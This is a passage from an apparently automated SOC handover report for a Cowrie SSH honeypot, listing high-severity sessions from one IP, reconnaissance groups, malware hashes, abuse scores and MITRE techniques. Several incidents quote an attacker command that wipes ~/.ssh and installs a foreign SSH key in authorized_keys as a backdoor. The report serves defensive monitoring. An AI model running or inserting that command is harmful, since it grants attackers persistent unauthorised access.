|---|---|
| `2026-05-23 13:19:03` | `cowrie.session.connect` |
| `2026-05-23 13:19:03` | `cowrie.client.version` |
| `2026-05-23 13:19:03` | `cowrie.client.kex` |
| `2026-05-23 13:19:04` | `cowrie.login.success` |
| `2026-05-23 13:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-282b3ba53c4f

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:24 |
| **Last Seen** | 2026-05-23 13:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:24:02` | `cowrie.session.connect` |
| `2026-05-23 13:24:02` | `cowrie.client.version` |
| `2026-05-23 13:24:02` | `cowrie.client.kex` |
| `2026-05-23 13:24:03` | `cowrie.login.success` |
| `2026-05-23 13:24:04` | `cowrie.session.params` |
| `2026-05-23 13:24:04` | `cowrie.command.input` |
| `2026-05-23 13:24:04` | `cowrie.command.failed` |
| `2026-05-23 13:24:04` | `cowrie.log.closed` |
| `2026-05-23 13:24:04` | `cowrie.session.params` |
| `2026-05-23 13:24:04` | `cowrie.command.input` |
| `2026-05-23 13:24:04` | `cowrie.session.file_download` |
| `2026-05-23 13:24:04` | `cowrie.log.closed` |
| `2026-05-23 13:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98ec7cb01a8b

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:24 |
| **Last Seen** | 2026-05-23 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:24:07` | `cowrie.session.connect` |
| `2026-05-23 13:24:07` | `cowrie.client.version` |
| `2026-05-23 13:24:07` | `cowrie.client.kex` |
| `2026-05-23 13:24:08` | `cowrie.login.success` |
| `2026-05-23 13:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0393296a6560

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:27 |
| **Last Seen** | 2026-05-23 13:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:27:37` | `cowrie.session.connect` |
| `2026-05-23 13:27:37` | `cowrie.client.version` |
| `2026-05-23 13:27:38` | `cowrie.client.kex` |
| `2026-05-23 13:27:38` | `cowrie.login.success` |
| `2026-05-23 13:27:39` | `cowrie.session.params` |
| `2026-05-23 13:27:39` | `cowrie.command.input` |
| `2026-05-23 13:27:39` | `cowrie.command.failed` |
| `2026-05-23 13:27:39` | `cowrie.log.closed` |
| `2026-05-23 13:27:39` | `cowrie.session.params` |
| `2026-05-23 13:27:39` | `cowrie.command.input` |
| `2026-05-23 13:27:40` | `cowrie.session.file_download` |
| `2026-05-23 13:27:40` | `cowrie.log.closed` |
| `2026-05-23 13:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57193f9f1091

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:27 |
| **Last Seen** | 2026-05-23 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:27:42` | `cowrie.session.connect` |
| `2026-05-23 13:27:42` | `cowrie.client.version` |
| `2026-05-23 13:27:42` | `cowrie.client.kex` |
| `2026-05-23 13:27:43` | `cowrie.login.success` |
| `2026-05-23 13:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbcb746235ae

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:29 |
| **Last Seen** | 2026-05-23 13:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:29:24` | `cowrie.session.connect` |
| `2026-05-23 13:29:24` | `cowrie.client.version` |
| `2026-05-23 13:29:25` | `cowrie.client.kex` |
| `2026-05-23 13:29:25` | `cowrie.login.success` |
| `2026-05-23 13:29:26` | `cowrie.session.params` |
| `2026-05-23 13:29:26` | `cowrie.command.input` |
| `2026-05-23 13:29:26` | `cowrie.command.failed` |
| `2026-05-23 13:29:26` | `cowrie.log.closed` |
| `2026-05-23 13:29:26` | `cowrie.session.params` |
| `2026-05-23 13:29:26` | `cowrie.command.input` |
| `2026-05-23 13:29:27` | `cowrie.session.file_download` |
| `2026-05-23 13:29:27` | `cowrie.log.closed` |
| `2026-05-23 13:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140d87ab99ad

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:29 |
| **Last Seen** | 2026-05-23 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:29:29` | `cowrie.session.connect` |
| `2026-05-23 13:29:29` | `cowrie.client.version` |
| `2026-05-23 13:29:29` | `cowrie.client.kex` |
| `2026-05-23 13:29:30` | `cowrie.login.success` |
| `2026-05-23 13:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78500541316f

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:31 |
| **Last Seen** | 2026-05-23 13:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:31:14` | `cowrie.session.connect` |
| `2026-05-23 13:31:14` | `cowrie.client.version` |
| `2026-05-23 13:31:14` | `cowrie.client.kex` |
| `2026-05-23 13:31:14` | `cowrie.login.success` |
| `2026-05-23 13:31:15` | `cowrie.session.params` |
| `2026-05-23 13:31:15` | `cowrie.command.input` |
| `2026-05-23 13:31:15` | `cowrie.command.failed` |
| `2026-05-23 13:31:15` | `cowrie.log.closed` |
| `2026-05-23 13:31:15` | `cowrie.session.params` |
| `2026-05-23 13:31:15` | `cowrie.command.input` |
| `2026-05-23 13:31:16` | `cowrie.session.file_download` |
| `2026-05-23 13:31:16` | `cowrie.log.closed` |
| `2026-05-23 13:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb33aa2795c6

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-05-23 13:31 |
| **Last Seen** | 2026-05-23 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 13:31:18` | `cowrie.session.connect` |
| `2026-05-23 13:31:18` | `cowrie.client.version` |
| `2026-05-23 13:31:18` | `cowrie.client.kex` |
| `2026-05-23 13:31:19` | `cowrie.login.success` |
| `2026-05-23 13:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `170.84.212[.]53` | **28** | 2026-05-23 12:06 | 2026-05-23 13:28 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `197.153.57[.]103` | **11** | 2026-05-23 11:25 | 2026-05-23 13:33 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.110.2[.]158` | **3** | 2026-05-23 12:43 | 2026-05-23 12:45 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-05-23 12:29 | 2026-05-23 12:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.166.94[.]133` | **2** | 2026-05-23 12:02 | 2026-05-23 12:04 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.111[.]119` | 1 | 2026-05-23 13:08 | 2026-05-23 13:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.42[.]17` | 1 | 2026-05-23 12:19 | 2026-05-23 12:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `126.38.54[.]116` | 1 | 2026-05-23 11:49 | 2026-05-23 11:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.184.38[.]93` | 1 | 2026-05-23 11:47 | 2026-05-23 11:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.170[.]245` | 1 | 2026-05-23 12:19 | 2026-05-23 12:20 | 23s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-05-23 12:19 | 2026-05-23 12:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `208.109.212[.]211` | 1 | 2026-05-23 13:01 | 2026-05-23 13:01 | 32s | 0 | `T1592` | 🟢 LOW |
| `223.93.164[.]218` | 1 | 2026-05-23 12:15 | 2026-05-23 12:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `44.211.45[.]255` | 1 | 2026-05-23 12:55 | 2026-05-23 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]183` | 1 | 2026-05-23 11:30 | 2026-05-23 11:30 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.222.228[.]70` | 1 | 2026-05-23 11:54 | 2026-05-23 11:54 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **31/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.110.2[.]158` | VN | Viettel Group | **100** ⚠️ | 1 |
| `185.242.226[.]18` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `208.109.212[.]211` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `180.184.38[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `223.93.164[.]218` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `120.48.42[.]17` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `126.38.54[.]116` | JP | Japan Nation-wide Network of Softbank Corp. | **100** ⚠️ | 0 |
| `143.198.221[.]188` | SG | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `170.84.212[.]53` | AR | Wiltel Comunicaciones SA | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 45 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |

---

## 🔕 False Positive Summary (46 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 39 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 122 cases |
| Tool 34  | Credential Extractor        | ✅ 37 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 46 filtered (37.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 19 priority case(s) shown individually · 16 recon entry/entries in table (5 group(s) consolidating 46 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T13:43:40Z_
